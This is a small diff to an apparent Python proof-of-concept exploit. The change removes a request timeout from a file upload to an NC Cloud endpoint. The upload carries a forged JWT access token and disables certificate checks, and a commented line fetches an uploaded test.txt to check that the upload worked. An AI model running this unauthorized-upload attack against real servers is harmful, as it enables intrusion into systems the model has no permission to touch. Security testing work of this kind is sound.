@@ -87,7 +87,7 @@ class poc:
         }
         self.headers_upload["accessTokenNcc"] = "{}".format(self.create_jwt())
         try:
-            result = requests.post(url=url, files=data, headers=self.headers_upload, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, files=data, headers=self.headers_upload, verify=False, proxies=self.proxies)
             # req = requests.get("{}://{}/nccloud/test.txt".format(scheme, netloc), headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
             if "nologin" not in result.text and "操作成功" in result.text:
                 target = urlparse(url)
